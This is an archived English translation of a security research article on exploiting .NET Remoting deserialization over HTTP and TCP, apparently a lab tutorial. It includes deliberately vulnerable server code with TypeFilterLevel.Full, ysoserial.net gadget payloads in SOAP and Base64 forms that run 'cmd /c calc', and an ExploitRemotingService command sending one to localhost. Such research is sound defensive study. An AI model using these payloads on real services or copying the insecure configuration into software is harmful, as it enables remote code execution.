---
type: Code
title: "Y4er/dotnet-deserialization: .NET Remoting.md"
resource: "https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md"
tags: [code, ysonet-reference, en, github]
generated:
  by: ysonet-refs/1
  at: "2026-08-04T21:29:32+00:00"
status: stable
stale_after: 2027-08-04
sources:
  - id: original
    resource: "https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md"
    title: "Y4er/dotnet-deserialization: .NET Remoting.md"
    author: Y4er
also_at: []
authors:
  - Y4er
canonical_url: ""
cited_by:
  - "docs/dotnet-deserialization-research.md:126"
commit: ""
content_sha256: a287146cba0cd8a0f486355e9b78be201bf5bc4d1f3f15d941e3d9b8369a5e15
depth: full
depth_reason: default
kind: code
language: en
licence: unknown
original_url: "https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md"
published: ""
publisher: GitHub
publisher_english: ""
raw_sha256: 49eb356ea2bc8426241aa7871cb7cc2da0d0ae21c2981d68dded021dcdfdb08b
retrieved_from: "https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md"
retrieved_kind: preserved-copy
retrieved_utc: "2026-08-04T21:29:32+00:00"
slug: github-dotnet-deserialization-net-remoting-md-main
snapshot: ""
title_english: ""
---

# Y4er/dotnet-deserialization: .NET Remoting.md

**Y4er/dotnet-deserialization: .NET Remoting.md** - Y4er, GitHub.

- Published: date not stated
- Original: <https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md>
- Preserved from: https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md (preserved-copy) on 2026-08-04
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source cited by ysonet, kept so the technique survives the
page going offline. To read the original, follow the link above.

## Content (English translation)

_English translation. Original text is retained in the content store; the source PDF, when available, retains its original language._

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# .NET Remoting.md

`Y4er/dotnet-deserialization` at `main`, path `.NET Remoting.md`.

# Introduction

.NET Remoting is a way to pass objects between different processes. Suppose two different processes act as the server and client, and both retain an identical copy of an object (DLL). .NET Remoting can then be used to transfer the object remotely. In Java terms, this is closer to the concept of RMI.

.NET Remoting can transfer remote objects over TCP, HTTP, or IPC. This article relies on the [VulnerableDotNetHTTPRemoting](https://github.com/nccgroup/VulnerableDotNetHTTPRemoting) project.

# Differences Between the Three Protocols

All three protocols are in the System.Runtime.Remoting.dll assembly. Their namespaces are System.Runtime.Remoting.Channels.Http, System.Runtime.Remoting.Channels.Tcp, and System.Runtime.Remoting.Channels.Ipc, respectively.

![image-20210518113143257](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210518113143257.png)

The protocols serve different purposes:

1. IpcChannel is used for inter-process communication on the same host. IPC is much faster than HTTP or TCP, but it can only operate locally and cannot cross machines, so it is not discussed in this article.
2. TcpChannel uses TCP. It binary-serializes objects and transmits the resulting binary stream, making it more efficient than HTTP transport.
3. HttpChannel uses HTTP. It SOAP-serializes objects and transmits XML over the network, giving it greater compatibility.

# .NET Remoting Demo

First, consider an HttpChannel demo to understand .NET Remoting. Three projects are required:

1. RemoteDemoClient
2. RemoteDemoServer
3. RemoteDemoObject

These represent the **client**, **server**, and **object to transfer**, respectively.

## Transfer Object Class

RemoteDemoObject.RemoteDemoObjectClass must inherit from MarshalByRefObject to be transferred remotely across an AppDomain.

```csharp
using System;

namespace RemoteDemoObject
{
    public class RemoteDemoObjectClass : MarshalByRefObject
    {
        public int count = 0;

        public int GetCount()
        {
            Console.WriteLine("GetCount called.");
            return count++;
        }
    }
}
```

## Server

The server registers an HttpServerChannel bound to port 9999. It then uses `RemotingConfiguration.RegisterWellKnownServiceType` to publish a remote invocation object of type RemoteDemoObjectClass at the URI RemoteDemoObjectClass.rem.

```csharp
using System;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Http;
using RemoteDemoObject;

namespace RemoteDemoServer
{
    class Program
    {
        static void Main(string[] args)
        {
            HttpServerChannel httpServerChannel = new HttpServerChannel(9999);
            ChannelServices.RegisterChannel(httpServerChannel, false);
            RemotingConfiguration.RegisterWellKnownServiceType(typeof(RemoteDemoObjectClass), "RemoteDemoObjectClass.rem", WellKnownObjectMode.Singleton);

            Console.WriteLine("server has been start");
            Console.ReadKey();
        }
    }
}
```

WellKnownObjectMode.Singleton is an enumeration whose meaning is shown below. The vulnerability is unrelated to these two enumeration values.

![image-20210519091039703](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519091039703.png)

## Client

```csharp
using RemoteDemoObject;
using System;

namespace RemoteDemoClient
{
    class Program
    {
        static void Main(string[] args)
        {
            string serverAddress = "http://localhost:9999/RemoteDemoObjectClass.rem";
            RemoteDemoObjectClass obj1 = (RemoteDemoObjectClass)Activator.GetObject(typeof(RemoteDemoObjectClass), serverAddress);

            Console.WriteLine("call GetCount() get return value:{0}",obj1.GetCount());
            Console.ReadKey();
        }
    }
}
```

The client obtains the remote object through Activator.GetObject and returns an instance.

## Result

```
PS C:\RemoteDemoClient\bin\Debug> .\RemoteDemoClient.exe
call GetCount() get return value:0
PS C:\RemoteDemoServer\bin\Debug> .\RemoteDemoServer.exe
server has been start
GetCount called.
```

Running the client three times returns a count of three and prints `GetCount called.` three times; the count on the server increments automatically.

# HttpServerChannel Packets

Burp's invisible proxy feature can proxy the client's request packets. First, modify the listener to enable invisible proxying.

![image-20210519091858654](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519091858654.png)

Then change port 9999 to 8080 in the client code.

```csharp
using RemoteDemoObject;
using System;

namespace RemoteDemoClient
{
    class Program
    {
        static void Main(string[] args)
        {
            string serverAddress = "http://localhost:8080/RemoteDemoObjectClass.rem";
            RemoteDemoObjectClass obj1 = (RemoteDemoObjectClass)Activator.GetObject(typeof(RemoteDemoObjectClass), serverAddress);

            Console.WriteLine("call GetCount() get return value:{0}",obj1.GetCount());
            Console.ReadKey();
        }
    }
}
```

Run the client again and capture the request.

![image-20210519092106925](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519092106925.png)

The preceding image shows that HttpServerChannel uses SOAP to transfer objects. Looking more deeply at its implementation:

![image-20210519092343993](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519092343993.png)

The constructor enters `this.SetupChannel()`.

![image-20210519092422683](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519092422683.png)

It then checks whether its _sinkProvider is null and, if so, calls CreateDefaultServerProviderChain().

![image-20210519092515200](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519092515200.png)

This uses a provider chain: SdlChannelSinkProvider -> SoapServerFormatterSinkProvider -> BinaryServerFormatterSinkProvider.

![image-20210519102848623](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519102848623.png)

TcpServerChannel instead uses BinaryServerFormatterSinkProvider -> SoapServerFormatterSinkProvider.

![image-20210519103010772](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519103010772.png)

This shows that HTTP uses SOAP serialization, while TCP uses binary serialization.

# Cause of the Vulnerability

SoapServerFormatterSinkProvider and BinaryServerFormatterSinkProvider, mentioned above, both have an important **TypeFilterLevel** property. [The documentation](https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.formatters.typefilterlevel?view=net-5.0) shows that it is an enumeration.

![image-20210519104330838](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519104330838.png)

When it is Full, all types are deserialized. When it is Low, only types associated with basic remoting functionality are deserialized. Setting it to Full introduces the vulnerability.

# Attacking HttpServerChannel

Modify the server code.

```csharp
using System;
using System.Collections;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Http;
using System.Runtime.Serialization.Formatters;
using RemoteDemoObject;

namespace RemoteDemoServer
{
    class Program
    {
        static void Main(string[] args)
        {
            SoapServerFormatterSinkProvider soapServerFormatterSinkProvider = new SoapServerFormatterSinkProvider()
            {
                TypeFilterLevel = TypeFilterLevel.Full
            };

            IDictionary hashtables = new Hashtable();
            hashtables["port"] = 9999;

            HttpServerChannel httpServerChannel = new HttpServerChannel(hashtables,soapServerFormatterSinkProvider);
            ChannelServices.RegisterChannel(httpServerChannel, false);
            RemotingConfiguration.RegisterWellKnownServiceType(typeof(RemoteDemoObjectClass), "RemoteDemoObjectClass.rem", WellKnownObjectMode.Singleton);

            Console.WriteLine("server has been start");
            Console.ReadKey();
        }
    }
}
```

Use the two-argument HttpServerChannel overload, pass in SoapServerFormatterSinkProvider, and assign `TypeFilterLevel = TypeFilterLevel.Full`. The SOAP request can now be changed to a **TextFormattingRunProperties** payload.

```xml
PS E:\code\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -f soapformatter -g TextFormattingRunProperties -c calc
<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<a1:TextFormattingRunProperties id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35">
<ForegroundBrush id="ref-3">&#60;?xml version=&#34;1.0&#34; encoding=&#34;utf-16&#34;?&#62;
&#60;ObjectDataProvider MethodName=&#34;Start&#34; IsInitialLoadEnabled=&#34;False&#34; xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34; xmlns:sd=&#34;clr-namespace:System.Diagnostics;assembly=System&#34; xmlns:x=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;&#62;
  &#60;ObjectDataProvider.ObjectInstance&#62;
    &#60;sd:Process&#62;
      &#60;sd:Process.StartInfo&#62;
        &#60;sd:ProcessStartInfo Arguments=&#34;/c calc&#34; StandardErrorEncoding=&#34;{x:Null}&#34; StandardOutputEncoding=&#34;{x:Null}&#34; UserName=&#34;&#34; Password=&#34;{x:Null}&#34; Domain=&#34;&#34; LoadUserProfile=&#34;False&#34; FileName=&#34;cmd&#34; /&#62;
      &#60;/sd:Process.StartInfo&#62;
    &#60;/sd:Process&#62;
  &#60;/ObjectDataProvider.ObjectInstance&#62;
&#60;/ObjectDataProvider&#62;</ForegroundBrush>
</a1:TextFormattingRunProperties>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

**After deleting the `SOAP-ENV:Body` tag**, copy the request into Burp and send it; Calculator opens.

![image-20210519105336744](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519105336744.png)

# TcpServerChannel Packets

Remote invocation object code:

```csharp
using System;

namespace RemoteDemoObject
{
    public class RemoteDemoObjectClass : MarshalByRefObject
    {
        public int count = 0;

        public string GetCount()
        {
            Console.WriteLine("GetCount called.");
            return $"hello,{count++}";
        }
    }
}
```

Client:

```csharp
using RemoteDemoObject;
using System;

namespace RemoteDemoClient
{
    class Program
    {
        static void Main(string[] args)
        {
            string serverAddress = "tcp://localhost:9999/RemoteDemoObjectClass.rem";
            RemoteDemoObjectClass obj1 = (RemoteDemoObjectClass)Activator.GetObject(typeof(RemoteDemoObjectClass), serverAddress);

            Console.WriteLine("get string:\t{0}",obj1.GetCount());
            Console.ReadKey();
        }
    }
}
```

Server:

```csharp
using System;
using System.Collections;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Runtime.Serialization.Formatters;
using RemoteDemoObject;

namespace RemoteDemoServer
{
    class Program
    {
        static void Main(string[] args)
        {
            BinaryServerFormatterSinkProvider binary = new BinaryServerFormatterSinkProvider()
            {
                TypeFilterLevel = TypeFilterLevel.Full
            };

            IDictionary hashtables = new Hashtable();
            hashtables["port"] = 9999;

            TcpServerChannel httpServerChannel = new TcpServerChannel(hashtables,binary);
            ChannelServices.RegisterChannel(httpServerChannel, false);
            RemotingConfiguration.RegisterWellKnownServiceType(typeof(RemoteDemoObjectClass), "RemoteDemoObjectClass.rem", WellKnownObjectMode.Singleton);

            Console.WriteLine("server has been start");
            Console.ReadKey();
        }
    }
}
```

After capturing packets with Wireshark, follow the TCP stream.

![image-20210519110547764](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519110547764.png)

The stream begins with `2e 4e 45 54` `.NET` and uses binary transport for the remotely invoked method, type, and namespace. We can forge this TCP stream to send a malicious binary stream and achieve RCE through deserialization.

# Attacking TcpServerChannel

GitHub has an existing tool named [ExploitRemotingService](https://github.com/tyranid/ExploitRemotingService). Its raw parameter lets us send raw binary data. First, use ysoserial.net to generate a Base64 payload.

```
PS E:\code\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -f binaryformatter -g TextFormattingRunProperties -c calc -o base64
AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==
```

Then use ExploitRemotingService to send the packet.

```
PS C:\Users\ddd\Downloads\ExploitRemotingService-master\ExploitRemotingService\bin\Debug> .\ExploitRemotingService tcp://localhost:9999/RemoteDemoObjectClass.rem raw AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==
```

The result is shown below.

![image-20210519114342537](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519114342537.png)

This tool has many other uses and is worth studying.

# Finding .NET Remoting Applications

The protocol's signature lets Nmap detect it.

![image-20210519114959230](https://raw.githubusercontent.com/Y4er/dotnet-deserialization/main/.NET%20Remoting.assets/image-20210519114959230.png)

During real penetration tests, pay close attention to endpoints with a .rem suffix.

# Auditing

Check whether the TypeFilterLevel field on instances created by TcpChannel, HttpChannel, or their subclasses is set to Full. ExploitRemotingService can also exploit Low, but only when the non-default global setting `ConfigurationManager.AppSettings.Set("microsoft:Remoting:AllowTransparentProxyMessage", false;` is enabled. This is uncommon and is mentioned only for awareness.

Look for URIs with a .rem suffix, as they may be .NET Remoting endpoints.

# Afterword

This article briefly introduced the fundamentals and exploitation of .NET Remoting. ExploitRemotingService is a project worth studying. It uses an approach resembling Java's dynamic registration of an RMI instance to execute custom code, from which I learned a great deal.

# References

1. https://www.codeproject.com/Articles/14791/NET-Remoting-with-an-Easy-Example
2. https://research.nccgroup.com/2019/03/19/finding-and-exploiting-net-remoting-over-http-using-deserialisation/
3. https://github.com/tyranid/ExploitRemotingService
